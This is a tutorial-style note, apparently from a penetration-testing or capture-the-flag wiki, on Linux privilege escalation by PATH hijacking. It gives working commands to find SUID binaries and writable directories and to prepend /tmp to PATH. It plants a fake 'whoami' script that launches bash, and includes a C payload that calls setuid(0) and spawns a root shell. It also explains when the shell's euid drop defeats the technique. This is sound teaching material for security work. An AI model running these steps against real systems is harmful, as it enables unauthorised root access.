# Linux — PATH Abuse

A privileged program calls a helper by **bare name** — `whoami`, not `/usr/bin/whoami`. The name is resolved at runtime through `$PATH`, and `$PATH` is an ordinary environment variable that you own. Put a writable directory earlier in it than the real binary, drop a file with the matching name there, and the privileged program executes your file instead.

This is the same shape as [[Cron-Jobs]] and [[Wildcard-Injection]]: a privileged component consuming something you control. Here the thing you control is not a file's *contents* but the **resolution order** that decides which file gets opened.

## Preconditions — all four, or it does not work

| # | Condition | Where it comes from |
|---|---|---|
| 1 | A privileged trigger — SUID binary, root cron job, sudo-able script | [[Linux-Local-Enumeration]] |
| 2 | It invokes a command **without an absolute path** | `strings`, then `ltrace` |
| 3 | A directory you can write to can be placed earlier in that `PATH` | `find / -writable -type d` |
| 4 | The privilege survives the child process | the euid section near the end |

Condition 4 is the one that quietly kills this technique, and most write-ups do not mention it. Read it before spending time on 1 to 3 — it takes two minutes and it decides whether the other three are worth anything.

## Find the trigger

```bash
find / -type f -perm -4000 2>/dev/null \
  | grep -vE '^/(snap|usr/lib|usr/libexec|usr/bin|usr/sbin|bin|sbin)/'
```

- `grep -vE '^/(...)/'` → drops the stock system directories in the same pass. The stock SUID set runs past the scrollback of most terminals and the one interesting line is at the top, where you can no longer reach it. Filtering at the source is cheaper than scrolling.
- the trailing `\` → continues the command onto the next line. Paste both lines together; the first line alone produces the unfiltered flood you were trying to avoid.
- `2>/dev/null` must sit on the `find`, not on the pipeline, or the permission-denied lines reach `grep` and survive the filter.

## Find the bare-name call

```bash
strings -d /opt/path/mywhoami
```

```bash
ltrace /opt/path/mywhoami
```

- `strings -d` → data sections only. Plain `strings` also dumps the symbol table and the debug info, which is where the misleading matches live; `-d` removes most of the triage below in one flag.
- `ltrace` → shows the library call **with its argument**, live. It answers in one line what `strings` answers by elimination, and it is the tool to reach for first when it is installed.
- if `ltrace` is absent, `strace -f -e trace=execve ./binary` shows the `execve` the shell performs, which names the resolved path.

```text
setuid(0)                = 0
setgid(0)                = 0
system("whoami" <unfinished ...>
```

When you are stuck with plain `strings`, triage by elimination — everything below is **not** the answer:

| Pattern | What it is |
|---|---|
| `libc.so.6`, `GLIBC_2.2.5`, `/lib64/ld-linux-...` | linker and library metadata |
| `setuid`, `setgid`, `system`, `__libc_start_main` | **imported libc function names**, not arguments |
| `mywhoami.c`, `crtstuff.c`, `Scrt1.o` | source filenames from the debug info |
| `_init`, `__bss_start`, `.text`, `.rodata` | symbol and section table |
| everything after the `GCC: (Ubuntu ...)` line | compiler metadata; stop reading there |
| `PTE1`, `u+UH`, `9*3$"` | machine-code bytes that happen to be printable |

## Find a writable directory

```bash
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)' | sort -u
```

- `-writable` → asks the kernel rather than reading mode bits, so it accounts for your group memberships and for ACLs. Reasoning about `ls -ld` output instead is how you conclude a directory is closed when it is not.
- `grep -vE '^/(proc|sys|run)'` → those three are writable in places by design and none of it is useful here. Without the filter the real answers are buried in `/proc/<pid>` entries.
- `sort -u` → sorts and drops duplicates so the list reads in one pass. `find` does not follow directory symlinks unless you ask it to, so this is tidying rather than a correction.

## Prepend, do not append

```bash
export PATH=/tmp:$PATH
```

```bash
hash -r
```

- the **position of `$PATH`** in the line is the entire technique. Resolution walks left to right and stops at the first match:

```text
export PATH=/tmp:$PATH   ->   /tmp:/usr/local/bin:/usr/bin:/bin     <- searched first
export PATH=$PATH:/tmp   ->   /usr/local/bin:/usr/bin:/bin:/tmp     <- searched last
```

- when the hijacked name is a real command — `whoami`, `ls`, `ps`, `service` — appending puts you behind `/usr/bin`, which already has it, and your file is never reached.
- `hash -r` → bash remembers where it found a command and ignores `$PATH` on the next call. This bites when *testing* the hijack in your own shell; it does not affect a C program's `system()`, which starts a fresh shell each time. Assigning to `PATH` clears that cache as well, which is why an export sometimes appears to work without this line.

## Plant the payload and fire it

```bash
cd /tmp
```

```bash
printf '#!/bin/bash\n/bin/bash\n' > whoami
```

```bash
chmod 700 whoami
```

```bash
/opt/path/mywhoami
```

```bash
id
```

- the filename must match the string from the previous step **exactly**. It is not a name you choose — the binary chose it at compile time, and the match is the entire mechanism.
- `chmod 700` → executable is the part that matters, and the owner bit is enough here: a root-triggered command runs your file whoever else can read it, so there is no reason to make it world-writable. A file that is present but not executable is skipped by `PATH` resolution as if it were not there, and produces `command not found` rather than a permission error.
- confirm with `id`, not with `whoami` → `whoami` is now your own script and will print whatever you told it to. This is the single most confusing way to misread a successful exploit.

## Why the privilege usually evaporates — and when it does not

The euid rule from [[Linux-SUID-Abuse#The rule that decides everything|SUID Abuse]] applies in full here, because `system()` is a fork:

```text
system("whoami")   ->   execl("/bin/sh", "sh", "-c", "whoami")
```

`system()` never runs the target directly. It starts **`/bin/sh`** and hands it the string — which is precisely why `$PATH` is consulted at all, since resolving bare names is the shell's job. But `sh` compares euid against ruid at startup and, when they differ, drops euid back to ruid. A SUID binary that calls `system("whoami")` and nothing else therefore runs your payload as **you**, not as root.

> [!important]
> The vector needs `setuid(0)`, or a call path with no shell in it. The worked case succeeds only because the source reads `setuid(0); setgid(0); system("whoami");`. `setuid(0)` sets the **real** UID to 0 — allowed, since euid is already 0 — and with ruid == euid == 0 the shell has nothing left to drop. `strings` showing `setuid` alongside `system` is the signal that this holds, and it is why that otherwise-noise symbol is worth one glance before you dismiss it.

When the binary does **not** call `setuid(0)`:

- if it uses `execvp()` or `execlp()` — PATH resolution without a shell — no drop happens. Your payload must then be a **compiled binary** that calls `setuid(0)` itself, since a `#!/bin/sh` script would reintroduce the interpreter and the drop:

```c
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/bash","bash",NULL); }
```

- if it uses `system()` — the shell is unavoidable and the vector yields only your own privilege. Note it as exploitable-if-called-by-root and move on.

The cron variant has no such problem: the job already runs as root with ruid == euid == 0, so a one-line shell script is enough. The catch there is the opposite one — you cannot `export` into root's environment, so you must find a bare-name call whose *existing* `PATH` already contains a directory you can write to. See [[Cron-Jobs]].
